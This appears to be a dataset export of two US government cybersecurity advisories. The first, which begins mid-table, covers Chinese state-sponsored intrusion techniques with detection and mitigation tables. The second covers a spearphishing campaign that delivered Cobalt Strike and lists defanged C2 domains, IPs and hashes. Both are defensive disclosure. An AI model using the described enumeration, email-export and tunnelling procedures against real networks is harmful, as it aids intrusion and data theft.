
Chinese state-sponsored cyber actors have been observed using commands, including tasklist, jobs, ps, or taskmgr, to reveal the running processes on victim devices.


Normal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell. 


Detect: 


Process Analysis 


Process Spawn Analysis [D3-PSA]


System Call Analysis [D3-SCA]




User Behavior Analysis [D3-UBA]






Network Service Scanning [T1046]


Chinese state-sponsored cyber actors have been observed using Nbtscan and nmap to scan and enumerate target network information.


•    Ensure that unnecessary ports and services are closed to prevent discovery and potential exploitation.
			•    Use network intrusion detection and prevention systems to detect and prevent remote service scans such as Nbtscan or nmap.
			•    Ensure proper network segmentation is followed to protect critical servers and devices to help mitigate potential exploitation.


Detect: 


Network Traffic Analysis


Connection Attempt Analysis [D3-CAA]




Isolate:


Network Isolation


Inbound Traffic Filtering [D3-ITF]








Remote System Discovery [T1018]


Chinese state-sponsored cyber actors have been observed using Base-64 encoded commands, including ping, net group, and net user to enumerate target network information.


Monitor for processes that can be used to discover remote systems, such as ping.exe and tracert.exe, especially when executed in quick succession.


Detect: 


Process Analysis 


Process Spawn Analysis [D3-PSA]




User Behavior Analysis


Job Function Access Pattern Analysis [D3-JFAPA]








Tactics: Lateral Movement [TA0008]
Table X: Chinese state-sponsored cyber actors’ Lateral Movement TTPs with detection and mitigation recommendations



Threat Actor Technique /
			Sub-Techniques
Threat Actor Procedure(s)
Detection and Mitigation Recommendations
Defensive Tactics and Techniques





Exploitation of Remote Services [T1210]


Chinese state-sponsored cyber actors used valid accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, RDP, and Virtual Network Computing (VNC). The actor may then perform actions as the logged-on user.
Chinese state-sponsored cyber actors also used on-premises Identity and Access Management (IdAM) and federation services in hybrid cloud environments in order to pivot to cloud resources.


Chinese state-sponsored cyber actors used valid accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, RDP, and Virtual Network Computing (VNC). The actor may then perform actions as the logged-on user.
Chinese state-sponsored cyber actors also used on-premises Identity and Access Management (IdAM) and federation services in hybrid cloud environments in order to pivot to cloud resources.


Disable or remove unnecessary services.


Minimize permissions and access for service accounts.


Perform vulnerability scanning and update software regularly.


Use threat intelligence and open-source exploitation databases to determine services that are targets for exploitation.




Detect: 


Network Traffic Analysis


Remote Terminal Session Detection [D3-RTSD] 




User Behavior Analysis [D3-UBA]


Isolate:


Execution Isolation


Mandatory Access Control [D3-MAC]








Tactics: Collection [TA0009]
Table XI: Chinese state-sponsored cyber actors’ Collection TTPs with detection and mitigation recommendations



Threat Actor Technique /
			Sub-Techniques
Threat Actor Procedure(s)
Detection and Mitigation Recommendations
Defensive Tactics and Techniques





Archive Collected Data [T1560]


Chinese state-sponsored cyber actors used compression and encryption of exfiltration files into RAR archives, and subsequently utilizing cloud storage services for storage.




Scan systems to identify unauthorized archival utilities or methods unusual for the environment.


Monitor command-line arguments for known archival utilities that are not common in the organization's environment.




Detect: 


Process Analysis 


File Access Pattern Analysis [D3-FAPA]


Process Spawn Analysis [D3-PSA]




Isolate:


Execution Isolation


Executable Denylisting [D3-EDL]








Clipboard Data [T1115]


Chinese state-sponsored cyber actors used RDP and execute rdpclip.exe to exfiltrate information from the clipboard.




Access to the clipboard is a legitimate function of many applications on an operating system. If an organization chooses to monitor for this behavior, then the data will likely need to be correlated against other suspicious or non-user-driven activity (e.g. excessive use of pbcopy/pbpaste (Linux) or clip.exe (Windows) run by general users through command line).


If possible, disable use of RDP and other file sharing protocols to minimize a malicious actor's ability to exfiltrate data.




Detect:


Network Traffic Analysis


Remote Terminal Session Detection  [D3-RTSD]




Isolate:


Network Isolation


Inbound Traffic Filtering [D3-ITF]


Outbound Traffic Filtering [D3-OTF] 








Data Staged [T1074]


Chinese state-sponsored cyber actors have been observed using the mv command to export files into a location, like a compromised Microsoft Exchange, IIS, or emplaced webshell prior to compressing and exfiltrating the data from the target network.


Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as using 7-Zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.


Detect: 


Process Analysis


File Access Pattern Analysis [D3-FAPA]








Email Collection [T1114]


Chinese state-sponsored cyber actors have been observed using the New-MailboxExportRequest PowerShell cmdlet to export target email boxes.




Audit email auto-forwarding rules for suspicious or unrecognized rulesets.


Encrypt email using public key cryptography, where feasible.


Use MFA on public-facing mail servers.




Harden:


Credential Hardening


Multi-factor Authentication [D3-MFA]




Message Hardening


Message Encryption [D3-MENCR]




Detect: 


Process Analysis [D3-PA]






Tactics: Command and Control [TA0011]
Table XII: Chinese state-sponsored cyber actors’ Command and Control TTPs with detection and mitigation recommendations



Threat Actor Technique /
			Sub-Techniques
			 
Threat Actor Procedure(s)
Detection and Mitigation Recommendations
Defensive Tactics and Techniques





Application Layer Protocol [T1071]


Chinese state-sponsored cyber actors have been observed:


Using commercial cloud storage services for command and control.


Using malware implants that use the Dropbox® API for C2 and a downloader that downloads and executes a payload using the Microsoft OneDrive® API.




Use network intrusion detection and prevention systems with network signatures to identify traffic for specific adversary malware.


Detect: 


Network Traffic Analysis


Client-server Payload Profiling [D3-CSPP]


File Carving [D3-FC]




Isolate: 


Network Isolation


DNS Denylisting [D3-DNSDL]








Ingress Tool Transfer [T1105]


Chinese state-sponsored cyber actors have been observed importing tools from GitHub or infected domains to victim networks. In some instances. Chinese state-sponsored cyber actors used the Server Message Block (SMB) protocol to import tools into victim networks.




Perform ingress traffic analysis to identify transmissions that are outside of normal network behavior. 


Do not expose services and protocols (such as File Transfer Protocol [FTP]) to the Internet without strong business justification.


Use signature-based network intrusion detection and prevention systems to identify adversary malware coming into the network.




Isolate:


Network Isolation


Inbound Traffic Filtering [D3-ITF]








Non-Standard Port [T1571]


Chinese state-sponsored cyber actors have been observed using a non-standard SSH port to establish covert communication channels with VPS infrastructure. 




Use signature-based network intrusion detection and prevention systems to identify adversary malware calling back to C2.


Configure firewalls to limit outgoing traffic to only required ports based on the functions of that network segment.


Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port.




Detect:  


Network Traffic Analysis


Client-server Payload Profiling [D3-CSPP]


Protocol Metadata Anomaly Detection [D3-PMAD]




Isolate:


Network Isolation


Inbound Traffic Filtering [D3-ITF]


Outbound Traffic Filtering [D3-OTF]








Protocol Tunneling [T1572]


Chinese state-sponsored cyber actors have been observed using tools like dog-tunnel and dns2tcp.exe to conceal C2 traffic with existing network activity. 




Monitor systems for connections using ports/protocols commonly associated with tunneling, such as SSH (port 22). Also monitor for processes commonly associated with tunneling, such as Plink and the OpenSSH client.


Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards.


Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) 




Detect: 


Network Traffic Analysis


Protocol Metadata Anomaly Detection [D3-PMAD]








Proxy [T1090]: 


Multi-Hop Proxy [T1090.003]




Chinese state-sponsored cyber actors have been observed using a network of VPSs and small office and home office (SOHO) routers as part of their operational infrastructure to evade detection and host C2 activity. Some of these nodes operate as part of an encrypted proxy service to prevent attribution by concealing their country of origin and TTPs.


Monitor traffic for encrypted communications originating from potentially breached routers to other routers within the organization. Compare the source and destination with the configuration of the device to determine if these channels are authorized VPN connections or other encrypted modes of communication.


Alert on traffic to known anonymity networks (such as Tor) or known adversary infrastructure that uses this technique.


Use network allow and blocklists to block traffic to known anonymity networks and C2 infrastructure.




Detect: 


Network Traffic Analysis


Protocol Metadata Anomaly Detection [D3-PMAD]


Relay Pattern Analysis [D3-RPA]




Isolate: 


Network Isolation


Outbound Traffic Filtering [D3-OTF]








Appendix B: MITRE ATT&CK Framework 

Figure 2: MITRE ATT&CK Enterprise tactics and techniques used by Chinese state-sponsored cyber actors (Click here for the downloadable JSON file.) 

Contact Information

To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.
To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.dhs.gov.
For NSA client requirements or general cybersecurity inquiries, contact the NSA Cybersecurity Requirements Center at 410-854-4200 or Cybersecurity_Requests@nsa.gov.
Media Inquiries / Press Desk:
•    NSA Media Relations, 443-634-0721, MediaRelations@nsa.gov
•    CISA Media Relations, 703-235-2010, CISAMedia@cisa.dhs.gov
•    FBI National Press Office, 202-324-3691, npo@fbi.gov

References

[1] FireEye: This is Not a Test: APT41 Initiates Global Intrusion Campaign Using Multiple Exploits

Revisions

July 19, 2021: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0008', 'T1566.002', 'T1505.003', 'T1204.002', 'T1564', 'T1053', 'T1140', 'T1204', 'T1055.001', 'T1204.001', 'T1070', 'TA0009', 'TA0042', 'T1053.003', 'TA0007', 'T1090.003', 'TA0003', 'T1083', 'T1212', 'T1556', 'T1059.004', 'T1560', 'T1583', 'T1210', 'T1484.001', 'T1115', 'T1556.001', 'T1595', 'T1574.001', 'TA0002', 'T1059', 'T1078.001', 'T1059.003', 'T1055', 'T1608', 'T1055.002', 'T1588.002', 'T1059.008', 'T1571', 'TA0006', 'T1190', 'T1003.001', 'T1572', 'TA0043', 'T1078', 'T1046', 'T1588', 'T1566.001', 'T1133', 'T1574', 'T1218', 'T1071', 'T1059.001', 'T1074', 'T1189', 'T1543', 'T1484', 'T1505', 'TA0005', 'T1018', 'T1105', 'T1069', 'T1590', 'T1218.005', 'TA0011', 'T1078.002', 'T1059.006', 'T1027', 'T1543.003', 'T1218.011', 'T1003', 'T1114', 'T1090', 'TA0001', 'T1566', 'T1057', 'T1059.007', 'T1003.003', 'TA0004', 'T1053.005'}","




Summary

This advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, Version 9, and MITRE D3FEND™ framework, version 0.9.2-BETA-3. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques and the D3FEND framework for referenced defensive tactics and techniques.
The National Security Agency, Cybersecurity and Infrastructure Security Agency (CISA), and Federal Bureau of Investigation (FBI) assess that People’s Republic of China state-sponsored malicious cyber activity is a major threat to U.S. and Allied cyberspace assets. Chinese state-sponsored cyber actors aggressively target U.S. and allied political, economic, military, educational, and critical infrastructure (CI) personnel and organizations to steal sensitive data, critical and emerging key technologies, intellectual property, and personally identifiable information (PII). Some target sectors include managed service providers, semiconductor companies, the Defense Industrial Base (DIB), universities, and medical institutions. These cyber operations support China’s long-term economic and military development objectives.
This Joint Cybersecurity Advisory (CSA) provides information on tactics, techniques, and procedures (TTPs) used by Chinese state-sponsored cyber actors. This advisory builds on previous NSA, CISA, and FBI reporting to inform federal, state, local, tribal, and territorial (SLTT) government, CI, DIB, and private industry organizations about notable trends and persistent TTPs through collaborative, proactive, and retrospective analysis.
To increase the defensive posture of their critical networks and reduce the risk of Chinese malicious cyber activity, NSA, CISA, and FBI urge government, CI, DIB, and private industry organizations to apply the recommendations listed in the Mitigations section of this advisory and in Appendix A: Chinese State-sponsored Cyber Actors' Observed Procedures. Note: NSA, CISA, and FBI encourage organization leaders to review CISA Joint Insights: Chinese Malicious Cyber Activity: Threat Overview for Leaders for information on this threat to their organization.
Click here for a PDF version of this report.

Technical Details

Trends in Chinese State-Sponsored Cyber Operations
NSA, CISA, and FBI have observed increasingly sophisticated Chinese state-sponsored cyber activity targeting U.S. political, economic, military, educational, and CI personnel and organizations. NSA, CISA, and FBI have identified the following trends in Chinese state-sponsored malicious cyber operations through proactive and retrospective analysis:


Acquisition of Infrastructure and Capabilities. Chinese state-sponsored cyber actors remain agile and cognizant of the information security community’s practices. These actors take effort to mask their activities by using a revolving series of virtual private servers (VPSs) and common open-source or commercial penetration tools.


Exploitation of Public Vulnerabilities. Chinese state-sponsored cyber actors consistently scan target networks for critical and high vulnerabilities within days of the vulnerability’s public disclosure. In many cases, these cyber actors seek to exploit vulnerabilities in major applications, such as Pulse Secure, Apache, F5 Big-IP, and Microsoft products. For information on Common Vulnerabilities and Exposures (CVE) known to be exploited by malicious Chinese state-sponsored cyber actors, see:


CISA-FBI Joint CSA AA20-133A: Top 10 Routinely Exploited Vulnerabilities,


CISA Activity Alert: AA20-275A: Potential for China Cyber Response to Heightened U.S.-China Tensions, and


NSA CSA U/OO/179811-20: Chinese State-Sponsored Actors Exploit Publicly Known Vulnerabilities.




Encrypted Multi-Hop Proxies. Chinese state-sponsored cyber actors have been routinely observed using a VPS as an encrypted proxy. The cyber actors use the VPS as well as small office and home office (SOHO) devices as operational nodes to evade detection.


Observed Tactics and Techniques
Chinese state-sponsored cyber actors use a full array of tactics and techniques to exploit computer networks of interest worldwide and to acquire sensitive intellectual property, economic, political, and military information. Appendix B: MITRE ATT&CK Framework lists the tactics and techniques used by Chinese state-sponsored cyber actors. A downloadable JSON file is also available on the NSA Cybersecurity GitHub page.
Refer to Appendix A: Chinese State-Sponsored Cyber Actors’ Observed Procedures for information on procedures affiliated with these tactics and techniques as well as applicable mitigations.

Figure 1: Example of tactics and techniques used in various cyber operations.
 
Mitigations
NSA, CISA, and FBI urge federal and SLTT government, CI, DIB, and private industry organizations to apply the following recommendations as well as the detection and mitigation recommendations in Appendix A, which are tailored to observed tactics and techniques:


Patch systems and equipment promptly and diligently. Focus on patching critical and high vulnerabilities that allow for remote code execution or denial-of-service on externally facing equipment and CVEs known to be exploited by Chinese state-sponsored cyber actors. Consider implementing a patch management program that enables a timely and thorough patching cycle.
Note: for more information on CVEs routinely exploited by Chinese state-sponsored cyber actors refer to the resources listed in the Trends in Chinese State-Sponsored Cyber Operations section.

Enhance monitoring of network traffic, email, and endpoint systems. Review network signatures and indicators for focused activities, monitor for new phishing themes, and adjust email rules accordingly. Follow the best practices of restricting attachments via email and blocking URLs and domains based upon reputation. Ensure that log information is aggregated and correlated to enable maximum detection capabilities, with a focus on monitoring for account misuse. Monitor common ports and protocols for command and control (C2) activity. SSL/TLS inspection can be used to see the contents of encrypted sessions to look for network-based indicators of malware communication protocols. Implement and enhance network and endpoint event analysis and detection capabilities to identify initial infections, compromised credentials, and the manipulation of endpoint processes and files.
Use protection capabilities to stop malicious activity. Implement anti-virus software and other endpoint protection capabilities to automatically detect and prevent malicious files from executing. Use a network intrusion detection and prevention system to identify and prevent commonly employed adversarial malware and limit nefarious data transfers. Use a domain reputation service to detect suspicious or malicious domains. Use strong credentials for service accounts and multi-factor authentication (MFA) for remote access to mitigate an adversary's ability to leverage stolen credentials, but be aware of MFA interception techniques for some MFA implementations.▪

Resources
Refer to us-cert.cisa.gov/china, https://www.ic3.gov/Home/IndustryAlerts, and https://www.nsa.gov/What-We-Do/Cybersecurity/Advisories-Technical-Guidance/ for previous reporting on Chinese state-sponsored malicious cyber activity.
Disclaimer of Endorsement
The information and opinions contained in this document are provided ""as is"" and without any warranties or guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United States Government, and this guidance shall not be used for advertising or product endorsement purposes.
Purpose
This document was developed by NSA, CISA, and FBI in furtherance of their respective cybersecurity missions, including their responsibilities to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate stakeholders.
This document is marked TLP:WHITE. Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp/.
Trademark Recognition
MITRE and ATT&CK are registered trademarks of The MITRE Corporation. • D3FEND is a trademark of The MITRE Corporation. • Microsoft, Microsoft Exchange, Office 365, Microsoft Office, OneDrive, Outlook, OWA, PowerShell, Windows Defender, and Windows are registered trademarks of Microsoft Corporation. • Pulse Secure is a registered trademark of Pulse Secure, LLC. • Apache is a registered trademark of Apache Software Foundation. • F5 and BIG-IP are registered trademarks of F5 Networks. • Cobalt Strike is a registered trademark of Strategic Cyber LLC. • GitHub is a registered trademark of GitHub, Inc. • JavaScript is a registered trademark of Oracle Corporation. • Python is a registered trademark of Python Software Foundation. • Unix is a registered trademark of The Open Group. • Linux is a registered trademark of Linus Torvalds. • Dropbox is a registered trademark of Dropbox, Inc.
APPENDIX A: Chinese State-Sponsored Cyber Actors’ Observed Procedures
Note: D3FEND techniques are based on the Threat Actor Procedure(s) and may not match automated mappings to ATT&CK techniques and sub-techniques.
Tactics: Reconnaissance,    
Table 1: Chinese state-sponsored cyber actors’ Reconnaissance TTPs with detection and mitigation recommendations

Tactics: Resource Development,
Table II: Chinese state-sponsored cyber actors’ Resource Development TTPs with detection and mitigation recommendations

Tactics: Initial Access,
Table III: Chinese state-sponsored cyber actors’ Initial Access TTPs with detection and mitigation recommendations

Tactics: Execution,
Table IV: Chinese state-sponsored cyber actors’ Execution TTPs with detection and mitigation recommendations

Tactics: Persistence,
Table V: Chinese state-sponsored cyber actors’ Persistence TTPs with detection and mitigation recommendations

Tactics: Privilege Escalation,
Table VI: Chinese state-sponsored cyber actors’ Privilege Escalation TTPs with detection and mitigation recommendations

Tactics: Defense Evasion,
Table VII: Chinese state-sponsored cyber actors’ Defensive Evasion TTPs with detection and mitigation recommendations

Tactics: Credential Access,
Table VIII: Chinese state-sponsored cyber actors’ Credential Access TTPs with detection and mitigation recommendations

Tactics: Discovery,
Table IX: Chinese state-sponsored cyber actors’ Discovery TTPs with detection and mitigation recommendations

Tactics: Lateral Movement,
Table X: Chinese state-sponsored cyber actors’ Lateral Movement TTPs with detection and mitigation recommendations

Tactics: Collection,
Table XI: Chinese state-sponsored cyber actors’ Collection TTPs with detection and mitigation recommendations

Tactics: Command and Control,
Table XII: Chinese state-sponsored cyber actors’ Command and Control TTPs with detection and mitigation recommendations

Appendix B: MITRE ATT&CK Framework 

Figure 2: MITRE ATT&CK Enterprise tactics and techniques used by Chinese state-sponsored cyber actors (Click here for the downloadable JSON file.) 

Contact Information

To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.
To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.dhs.gov.
For NSA client requirements or general cybersecurity inquiries, contact the NSA Cybersecurity Requirements Center at 410-854-4200 or Cybersecurity_Requests@nsa.gov.
Media Inquiries / Press Desk:
•    NSA Media Relations, 443-634-0721, MediaRelations@nsa.gov
•    CISA Media Relations, 703-235-2010, CISAMedia@cisa.dhs.gov
•    FBI National Press Office, 202-324-3691, npo@fbi.gov

References,1, FireEye: This is Not a Test: APT41 Initiates Global Intrusion Campaign Using Multiple Exploits

Revisions

July 19, 2021: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-200b
64,"




Summary

This Joint Cybersecurity Advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, Version 9. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
The Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation (FBI) are engaged in addressing a spearphishing campaign targeting government organizations, intergovernmental organizations (IGOs), and non-governmental organizations (NGOs). A sophisticated cyber threat actor leveraged a compromised end-user account from Constant Contact, a legitimate email marketing software company, to spoof a U.S.-based government organization and distribute links to malicious URLs.[1] CISA and FBI have not determined that any individual accounts have been specifically targeted by this campaign.
Note: CISA and FBI acknowledge open-source reporting attributing the activity discussed in the report to APT29 (also known as Nobelium, The Dukes, and Cozy Bear).[2,3] However, CISA and FBI are investigating this activity and have not attributed it to any threat actor at this time. CISA and FBI will update this Joint Cybersecurity Advisory as new information becomes available. Note:
This Joint Cybersecurity Advisory contains information on tactics, techniques, and procedures (TTPs) and malware associated with this campaign. For more information on the malware, refer to Malware Analysis Report MAR-10339794-1.v1: Cobalt Strike Beacon.
CISA and FBI urge governmental and international affairs organizations and individuals associated with such organizations to adopt a heightened state of awareness and implement the recommendations in the Mitigations section of this advisory.
For a downloadable list of indicators of compromise (IOCs), refer to AA21-148A.stix, and MAR-10339794-1.v1.stix.
Click here for a PDF version of this report.

Technical Details

Based on incident reports, malware collection, and trusted third-party reporting, CISA and FBI are engaged in addressing a sophisticated spearphishing campaign. A cyber threat actor leveraged a compromised end-user account from Constant Contact, a legitimate email marketing software company, to send phishing emails to more than 7,000 accounts across approximately 350 government organizations, IGOs, and NGOs. The threat actor sent spoofed emails that appeared to originate from a U.S. Government organization. The emails contained a legitimate Constant Contact link that redirected to a malicious URL [T1566.002, T1204.001], from which a malicious ISO file was dropped onto the victim’s machine.
The ISO file contained (1) a malicious Dynamic Link Library (DLL) named Documents.dll [T1055.001], which is a custom Cobalt Strike Beacon version 4 implant, (2) a malicious shortcut file that executes the Cobalt Strike Beacon loader [T1105], and (3) a benign decoy PDF titled “Foreign Threats to the 2020 US Federal Elections” with file name “ICA-declass.pdf” (see figure 1). Note: The decoy file appears to be a copy of the declassified Intelligence Community Assessment pursuant to Executive Order 13848 Section 1(a), which is available at https://www.intelligence.gov/index.php/ic-on-the-record-database/results/1046-foreign-threats-to-the-2020-us-federal-elections-intelligence-community-assessment.

Figure 1: Decoy PDF: ICA-declass.pdf
Cobalt Strike is a commercial penetration testing tool used to conduct red team operations.[4] It contains a number of tools that complement the cyber threat actor’s exploitation efforts, such as a keystroke logger, file injection capability, and network services scanners. The Cobalt Strike Beacon is the malicious implant that calls back to attacker-controlled infrastructure and checks for additional commands to execute on the compromised system [TA0011].
The configuration file for this Cobalt Strike Beacon implant contained communications protocols, an implant watermark, and the following hardcoded command and control (C2) domains:

dataplane.theyardservice[.]com/jquery-3.3.1.min.woff2
cdn.theyardservice[.]com/jquery-3.3.1.min.woff2
static.theyardservice[.]com/jquery-3.3.1.min.woff2
worldhomeoutlet[.]com/jquery-3.3.1.min.woff2

The configuration file was encoded via an XOR with the key 0x2e and a 16-bit byte swap.
For more information on the ISO file and Cobalt Strike Beacon implant, including IOCs, refer to Malware Analysis Report MAR-10339794-1.v1: Cobalt Strike Beacon.
Indicators of Compromise
The following IOCS were derived from trusted third parties and open-source research. For a downloadable list of IOCs, refer to AA21-148A.stix and MAR-10339794-1.v1.stix.

URL: https[:]//r20.rs6.net/tn.jsp?f=
Host IP: 208.75.122[.]11 (US)
Owner: Constant Contact, Inc.
Activity: legitimate Constant Contact link found in phishing email that redirects victims to actor-controlled infrastructure at https[:]//usaid.theyardservice.com/d/<target_email_address>
	 
URL: https[:]//usaid.theyardservice.com/d/<target_email_address>
Host IP: 83.171.237[.]173 (Germany)
Owner: [redacted]
First Seen: May 25, 2021
Activity: actor-controlled URL that was redirected from https[:]//r20.rs6.net/tn.jsp?f=; the domain usaid[.]theyardservice.com was detected as a malware site; hosted a malicious ISO file ""usaid[.]theyardservice.com""
	 
File: ICA-declass.iso [MD5: cbc1dc536cd6f4fb9648e229e5d23361]
File Type: Macintosh Disk Image
Detection: Artemis!7EDF943ED251, Trojan:Win32/Cobaltstrike!MSR, or other malware
Activity: ISO file container; contains a custom Cobalt Strike Beacon loader; communicated with multiple URLs, domains, and IP addresses
	 
File: /d/ [MD5: ebe2f8df39b4a94fb408580a728d351f]
File Type: Macintosh Disk Image
Detection: Cobalt, Artemis!7EDF943ED251, or other malware
Activity: ISO file container; contains a custom Cobalt Strike Beacon loader; communicated with multiple URLs, domains, and IP addresses
	 
File: ICA-declass.iso [MD5: 29e2ef8ef5c6ff95e98bff095e63dc05]
File Type: Macintosh Disk Image
Detection: Cobalt Strike, Rozena, or other malware
Activity: ISO file container; contains a custom Cobalt Strike Beacon loader; communicated with multiple URLs, domains, and IP addresses
	 
File: Reports.lnk [MD5: dcfd60883c73c3d92fceb6ac910d5b80]
File Type: LNK (Windows shortcut)
Detection: Worm: Win32-Script.Save.df8efe7a, Static AI - Suspicious LNK, or other malware
Activity: shortcut contained in malicious ISO files; executes a custom Cobalt Strike Beacon loader
	 
File: ICA-declass.pdf [MD5: b40b30329489d342b2aa5ef8309ad388]
File Type: PDF
Detection: undetected
Activity: benign, password-protected PDF displayed to victim as a decoy; currently unrecognized by antivirus software
	 
File: DOCUMENT.DLL [MD5: 7edf943ed251fa480c5ca5abb2446c75]
File Type: Win32 DLL
Detection: Trojan: Win32/Cobaltstrike!MSR, Rozena, or other malware
Activity: custom Cobalt Strike Beacon loader contained in malicious ISO files; communicating with multiple URLs, domains, and IP addresses by antivirus software
	 
File: DOCUMENT.DLL [MD5: 1c3b8ae594cb4ce24c2680b47cebf808]
File Type: Win32 DLL
Detection: Cobalt Strike, Razy, Khalesi, or other malware
Activity: Custom Cobalt Strike Beacon loader contained in malicious ISO files; communicating with multiple URLs, domains, and IP addresses by antivirus software
	 
Domain: usaid[.]theyardservice.com
Host IP: 83.171.237[.]173 (Germany)
First Seen: May 25, 2021
Owner: Withheld for Privacy Purposes
Activity: subdomain used to distribute ISO file according to the trusted third party; detected as a malware site by antivirus programs
	 
Domain: worldhomeoutlet.com
Host IP: 192.99.221[.]77 (Canada)
Created Date: March 11, 2020
Owner: Withheld for Privacy Purposes by Registrar
Activity: Cobalt Strike C2 subdomain according to the trusted third party; categorized as suspicious and observed communicating with multiple malicious files according to antivirus software; associated with Cobalt Strike malware
	 
Domain: dataplane.theyardservice[.]com
Host IP: 83.171.237[.]173 (Germany)
First Seen: May 25, 2021
Owner: [redacted]
Activity: Cobalt Strike C2 subdomain according to the trusted third party; categorized as suspicious and observed communicating with multiple malicious files according to antivirus software; observed in phishing, malware, and spam activity
	 
Domain: cdn.theyardservice[.]com
Host IP: 83.171.237[.]173 (Germany)
First Seen: May 25, 2021
Owner: Withheld for Privacy Purposes by Registrar
Activity: Cobalt Strike C2 subdomain according to the trusted third party; categorized as suspicious and observed communicating with multiple malicious files according to antivirus software
	 
Domain: static.theyardservice[.]com
Host IP: 83.171.237[.]173 (Germany)
First Seen: May 25, 2021
Owner: Withheld for Privacy Purposes
Activity: Cobalt Strike C2 subdomain according to the trusted third party; categorized as suspicious and observed communicating with multiple malicious files according to antivirus software
	 
IP: 192.99.221[.]77
Organization: OVH SAS
Resolutions: 7
Geolocation: Canada
Activity: detected as a malware site; hosts a suspicious domain worldhomeoutlet[.]com; observed in Cobalt Strike activity
	 
IP: 83.171.237[.]173
Organization: Droptop GmbH
Resolutions: 15
Geolocation: Germany
Activity: Categorized as malicious by antivirus software; hosted multiple suspicious domains and multiple malicious files were observed downloaded from this IP address; observed in Cobalt Strike and activity
	 
Domain: theyardservice[.]com
Host IP: 83.171.237[.]173 (Germany)
Created Date: January 27, 2010
Owner: Withheld for Privacy Purposes
Activity: Threat actor controlled domain according to the trusted third party; categorized as suspicious by antivirus software; observed in Cobalt Strike activity

Table 1 provides a summary of the MITRE ATT&CK techniques observed.
Table 1: MITRE ATT&CK techniques observed




Technique Title

Technique ID





Process Injection: Dynamic-link Library Injection


T1055.001




Ingress Tool Transfer


T1105




User Execution: Malicious Link


T1204.001




Phishing: Spearphishing Link


T1566.002





Mitigations

CISA and FBI urge CI owners and operators to apply the following mitigations.

Implement multi-factor authentication (MFA) for every account. While privileged accounts and remote access systems are critical, it is also important to ensure full coverage across SaaS solutions. Enabling MFA for corporate communications platforms (as with all other accounts) provides vital defense against these types of attacks and, in many cases, can prevent them.
Keep all software up to date. The most effective cybersecurity programs quickly update all of their software as soon as patches are available. If your organization is unable to update all software shortly after a patch is released, prioritize implementing patches for CVEs that are already known to be exploited.
Implement endpoint and detection response (EDR) tools. EDR allows a high degree of visibility into the security status of endpoints and is can be an effective tool against threat actors.
Note: Organizations using Microsoft Defender for Endpoint or Microsoft 365 Defense should refer to Microsoft: Use attack surface reduction rules to prevent malware infection for more information on hardening the enterprise attack surface.
Implement centralized log management for host monitoring. A centralized logging application allows technicians to look out for anomalous activity in the network environment, such as new applications running on hosts, out-of-place communication between devices, or unaccountable login failures on machines. It also aids in troubleshooting applications or equipment in the event of a fault. CISA and the FBI recommend that organizations:

Forward logs from local hosts to a centralized log management server—often referred to as a security information and event management (SIEM) tool.
Ensure logs are searchable. The ability to search, analyze, and visualize communications will help analysts diagnose issues and may lead to detection of anomalous activity.
Correlate logs from both network and host security devices. By reviewing logs from multiple sources, an organization can better triage an individual event and determine its impact to the organization as a whole.
Review both centralized and local log management policies to maximize efficiency and retain historical data. Organizations should retain critical logs for a minimum of 30 days.


Deploy signatures to detect and/or block inbound connection from Cobalt Strike servers and other post-exploitation tools.
Implement unauthorized execution prevention by disabling macro scripts from Microsoft Office files transmitted via email. Consider using Office Viewer software to open Microsoft Office files transmitted via email instead of full Microsoft Office suite applications.
Configure and maintain user and administrative accounts using a strong account management policy.

Use administrative accounts on dedicated administration workstations.
Limit access to and use of administrative accounts.
Use strong passwords. For more information on strong passwords, refer to CISA Tip: Choosing and Protecting Passwords and National Institute of Standards (NIST) SP 800-63: Digital Identity Guidelines: Authentication and Lifecycle Management.
Remove default accounts if unneeded. Change the password of default accounts that are needed.
Disable all unused accounts.


Implement a user training program and simulated attacks for spearphishing to discourage users from visiting malicious websites or opening malicious attachments and re-enforce the appropriate user responses to spearphishing emails.

RESOURCES

